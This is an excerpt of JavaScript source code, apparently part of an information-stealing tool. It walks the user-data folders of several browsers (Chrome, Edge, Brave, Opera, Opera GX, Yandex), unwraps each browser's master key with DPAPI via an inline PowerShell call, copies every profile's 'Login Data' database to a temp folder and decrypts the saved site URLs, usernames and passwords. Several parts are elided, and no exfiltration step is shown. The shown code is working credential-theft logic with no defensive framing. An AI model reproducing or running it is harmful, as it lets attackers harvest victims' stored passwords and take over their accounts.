...
async function getEncrypted() {
    ...
    const browsers = [
        { dir: path.join(localappdata, 'Google', 'Chrome', 'User Data'), name: 'Chrome' },
        { dir: path.join(localappdata, 'Microsoft', 'Edge', 'User Data'), name: 'Edge' },
        { dir: path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data'), name: 'Brave' },
        { dir: path.join(appdata, 'Opera Software', 'Opera Stable'), name: 'Opera Stable' },
        { dir: path.join(appdata, 'Opera Software', 'Opera GX Stable'), name: 'Opera GX' },
        { dir: path.join(localappdata, 'Yandex', 'YandexBrowser', 'User Data'), name: 'Yandex' },
    ];

    const decryptPasswords = async (dbPath, key) => {
        const results = [];
        ...
        for (const { origin_url, username_value, password_value } of rows) {
            try {
                const buf = Buffer.isBuffer(password_value) ? password_value : Buffer.from(password_value);
                if (buf.slice(0, 3).toString() !== 'v10' && buf.slice(0, 3).toString() !== 'v11') continue;
                ...
                results.push({ url: origin_url, username: username_value, password: decrypted });
            } catch (_) { }
        }
        db.close();
        return results;
    ...
    const extractKey = (localStatePath) => {
        ...
        const encryptedKey = Buffer.from(encryptedKeyB64, 'base64').slice(5); // remove DPAPI
        const bytes = Array.from(encryptedKey);
        const ps = `
            try {
                Add-Type -AssemblyName System.Security;
                $d = [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(${bytes.join(',')}), $null, 'CurrentUser');
                $d -join ',';
            } catch { }
        `;
        const result = execSync(`powershell -Command "${ps}"`, { encoding: 'utf8' }).trim();
        const byteArray = result.split(',').map(n => parseInt(n)).filter(n => !isNaN(n));
    ...
    for (const browser of browsers) {
        ...
        let key;
        try {
            key = extractKey(localStatePath);
            if (!key || key.length < 16) continue;
        } catch (e) {
            continue;
        }
        for (const profile of profiles) {
            const loginDataPath = path.join(browser.dir, profile, 'Login Data');
            if (!fs.existsSync(loginDataPath)) continue;
            const tempPath = path.join(os.tmpdir(), `${browser.name}_${profile.replace(/\s/g, '_')}_${Date.now()}.db`);
            try {
                fs.copyFileSync(loginDataPath, tempPath);
                const results = await decryptPasswords(tempPath, key);
